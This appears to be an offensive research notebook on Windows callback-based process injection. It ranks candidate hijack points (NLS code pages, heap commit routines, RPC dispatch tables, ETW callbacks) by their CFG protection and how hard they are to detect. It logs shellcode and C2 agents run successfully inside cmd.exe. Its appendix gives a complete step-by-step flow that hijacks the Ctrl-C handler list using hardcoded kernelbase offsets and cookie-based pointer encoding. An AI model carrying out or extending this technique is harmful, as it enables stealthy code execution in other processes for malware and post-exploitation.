- [ ] Is it CFG protected?
- [ ] How do we trigger heap expansion reliably?
- [ ] What heaps have custom commit routines?

#### WinDbg Investigation Commands

```
# Examine heap structures
!heap -h
dt ntdll!_HEAP
dt ntdll!_RTL_HEAP_PARAMETERS

# Find commit routine references
x ntdll!*CommitRoutine*
x ntdll!*HeapCommit*
```

#### Complexity Assessment

- **Implementation**: High - heap internals are complex
- **Trigger**: Medium - heap expansion is controllable
- **Detection**: Low - heap operations are constant

---

### Candidate F: NLS Code Page Callbacks

#### Concept

National Language Support (NLS) handles string encoding conversions. Custom code pages can have conversion callbacks.

```c
// Code page info structure has function pointers for conversion
typedef struct _CPTABLEINFO {
    USHORT CodePage;
    USHORT MaximumCharacterSize;
    USHORT DefaultChar;
    USHORT UniDefaultChar;
    USHORT TransDefaultChar;
    USHORT TransUniDefaultChar;
    USHORT DBCSCodePage;
    UCHAR LeadByte[12];
    PUSHORT MultiByteTable;
    PVOID WideCharTable;
    PUSHORT DBCSRanges;
    PUSHORT DBCSOffsets;
} CPTABLEINFO, *PCPTABLEINFO;
```

#### Attack Theory

```
1. Understand how custom code page callbacks work
2. Register or hijack a code page conversion callback
3. Trigger string conversion in target (MultiByteToWideChar, etc.)
4. Callback executes shellcode
```

#### Why This Might Be Interesting

- **Very obscure**: NLS internals are rarely examined
- **Frequent operations**: String conversion happens constantly
- **Legacy system**: Predates modern security mitigations

#### Research Questions

- [ ] Do code page callbacks exist and where?
- [ ] Are they CFG protected?
- [ ] Can we register custom code pages remotely?
- [ ] What triggers code page callback invocation?

#### WinDbg Investigation Commands

```
# Find NLS structures
x ntdll!*Nls*
x ntdll!*CodePage*
x kernelbase!*MultiByteToWideChar*

# Check code page tables
dt ntdll!_CPTABLEINFO
```

#### Complexity Assessment

- **Implementation**: High - NLS is poorly documented
- **Trigger**: Low - string operations are constant
- **Detection**: Very low - NLS is never monitored

---

## Research Priority Matrix

| Candidate | Novelty | CFG Status | Complexity | Trigger Ease | Priority |
|-----------|---------|------------|------------|--------------|----------|
| **I: Application Recovery** | Very High | Unknown | Medium | Medium (natural) | Medium |
| **J: Memory Resource Notify** | Very High | Unknown (likely CFG) | Medium | Medium (natural) | Medium |
| **B: ActiveFrame** | Very High | Unknown | High | Unknown | Low |
| **E: Heap Commit** | Very High | Unknown | High | Medium | Low |
| **F: NLS Callbacks** | Very High | Unknown | Very High | Low | Low |
| **H: RPC Dispatch Tables** | Very High | ❌ **PROTECTED** | High | Low-Medium | ~~TOP~~ **BLOCKED** |
| **D: DllNotification** | Medium | ❌ **PROTECTED** | Medium | Low | ~~TOP~~ **BLOCKED** |
| **G: ETW Consumer Callbacks** | Very High | ❌ **PROTECTED** | Medium-High | Very Low (natural) | ~~TOP~~ **BLOCKED** |
| **A: TEB TxnScope** | Very High | N/A (vestigial) | N/A | N/A | ~~HIGH~~ **NOT VIABLE** |
| **C: UnhandledException** | Medium-High | ❌ **PROTECTED** | Low | Medium | ~~HIGH~~ **BLOCKED** |

## CFG Protection Summary

| Technique | CFG Protected? | Status |
|-----------|---------------|--------|
| Variant 1: Ctrl-C Handlers | ❌ No | ✅ **WORKING** |
| Variant 2: WNF Callbacks | ✅ Yes | ❌ Blocked |
| Variant 3: FLS Callbacks | ✅ Yes | ❌ Blocked |
| Candidate C: Exception Filter | ✅ Yes | ❌ Blocked |
| Candidate G: ETW Consumer Callbacks | ✅ Yes | ❌ Blocked |
| Candidate D: DLL Notifications | ✅ Yes | ❌ Blocked |
| Candidate H: RPC Dispatch Tables | ✅ Yes | ❌ Blocked |
| Candidate A: TEB TxnScope | N/A | ❌ Vestigial (never called) |
| Candidate I: Application Recovery | Unknown | Queued |
| Candidate J: Memory Resource Notify | Unknown (likely CFG) | Queued |

## Recommended Investigation Order (Updated)

### Phase 1: Top Priority - Truly Novel Techniques
1. **Candidate G: ETW Consumer Callbacks** - 🔍 INVESTIGATING NOW
   - Extremely obscure, natural triggers, broad applicability
2. **Candidate H: RPC Dispatch Tables** - 🔍 INVESTIGATING NOW
   - Pattern-matches Variant 1, controllable triggers, ubiquitous
3. **Candidate I: Application Recovery Callbacks** - 🔍 INVESTIGATING NOW
   - Natural triggers, interesting targets, likely obscure

### Phase 2: Previously Identified
4. **Candidate D: LdrpDllNotificationList** - 🔍 INVESTIGATING NOW
   - Easy trigger, similar to Variant 1 list manipulation

### Phase 3: Lower Priority
5. **Candidate J: Memory Resource Notifications** - Natural triggers but likely CFG
6. **Others** - Based on findings from Phases 1-2

### Completed Investigations
- ~~Candidate A: TEB TxnScope~~ - **NOT VIABLE** (vestigial, never invoked)
- ~~Candidate C: RtlpUnhandledExceptionFilter~~ - **BLOCKED BY CFG** (confirmed)

## Quick Reference: WinDbg Starting Commands

```
# For RPC Dispatch Tables - INVESTIGATING
x rpcrt4!*Dispatch*
x rpcrt4!*Interface*
x rpcrt4!*ServerRegister*
uf rpcrt4!NdrServerCall2
uf /c rpcrt4!NdrServerCall2 | findstr guard_dispatch_icall
dt rpcrt4!RPC_SERVER_INTERFACE
dt rpcrt4!RPC_DISPATCH_TABLE

# COMPLETED INVESTIGATIONS:

# For DLL Notifications - INVESTIGATED, CFG BLOCKED
x ntdll!*DllNotification*
uf ntdll!LdrpSendDllNotifications
# Result: guard_dispatch_icall at +0x8a

# For ETW Consumer Callbacks - INVESTIGATED, CFG BLOCKED
x sechost!*Trace*
x advapi32!*Trace*
uf sechost!EtwpDoEventTraceCallbacks
# Result: guard_dispatch_icall at +0x13 and +0x76

# For TEB Transaction Callbacks - INVESTIGATED, NOT VIABLE (vestigial)
dt ntdll!_TEB TxnScopeEnterCallback TxnScopeExitCallback @$teb
x ntdll!*Txn*

# For Unhandled Exception Filter - INVESTIGATED, CFG BLOCKED
x ntdll!*UnhandledException*
dq ntdll!RtlpUnhandledExceptionFilter L1

# For Heap Commit Routines - QUEUED
!heap -h
dt ntdll!_HEAP

# For NLS/Code Pages - QUEUED
x ntdll!*Nls*
x ntdll!*CodePage*
```

## Current Investigations (In Progress)

### Investigation 1: Candidate H (RPC Dispatch Tables)

**Key Questions:**
1. Where are RPC_SERVER_INTERFACE structures stored in memory?
2. Where are dispatch tables located?
3. Is RPC dispatch function invocation CFG protected?
4. How to enumerate registered interfaces in a target process?

**Current Status:**
- `NdrServerCall2` is just a wrapper that calls `NdrStubCall2`
- No CFG protection in `NdrServerCall2` itself
- Need to trace deeper into `NdrStubCall2` to find actual dispatch table invocation site

**Next Command Needed:**
```
uf rpcrt4!NdrStubCall2
```

Look for where the dispatch table function pointers are actually called. May need to trace even deeper if `NdrStubCall2` is also a wrapper.

---

## Test Results Log

| Date | Variant | Target | Shellcode | Result |
|------|---------|--------|-----------|--------|
| 2025 | 1 | cmd.exe | calc.bin | ✅ Success (manual trigger) |
| 2025 | 1 | cmd.exe | calc.bin | ✅ Success (auto trigger) |
| 2025 | 1 | cmd.exe | Fawkes (Go) | ❌ Failed - runtime issue |
| 2025 | 1 | cmd.exe | Apollo (C#) | ❌ Failed - CLR issue |
| 2025 | 1 | cmd.exe | Xenon (C) | ✅ Success |

---

## References

- Windows Internals, 7th Edition - Console internals chapter
- ReactOS source code - Structure hints for SetConsoleCtrlHandler
- Microsoft documentation - SetConsoleCtrlHandler, GenerateConsoleCtrlEvent
- Various security research papers on callback abuse
- WinDbg documentation - Memory examination commands

---

## Appendix: Full Attack Code Flow

```
1. OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION)
2. EnumProcessModulesEx → find kernelbase.dll base
3. Calculate:
   - pHandlerList = kernelbase + 0x399490
   - pHandlerListLength = kernelbase + 0x39CBB0
   - pAllocatedLength = kernelbase + 0x39CBB4
4. ReadProcessMemory(pHandlerList) → handlerArrayAddr
5. ReadProcessMemory(pHandlerListLength) → count
6. ReadProcessMemory(pAllocatedLength) → capacity
7. Verify count < capacity
8. NtQueryInformationProcess(ProcessCookie) → cookie
9. VirtualAllocEx(PAGE_EXECUTE_READWRITE) → shellcodeAddr
10. WriteProcessMemory(shellcodeAddr, shellcode)
11. encodedAddr = ROR(shellcodeAddr XOR cookie, cookie & 0x3F)
12. targetSlot = handlerArrayAddr + (count * 8)
13. WriteProcessMemory(targetSlot, encodedAddr)
14. WriteProcessMemory(pHandlerListLength, count + 1)
15. FreeConsole()
16. AttachConsole(targetPID)
17. GenerateConsoleCtrlEvent(CTRL_C_EVENT, 0)
18. FreeConsole()
19. AllocConsole()
20. Shellcode executes as Ctrl+C handler!
```
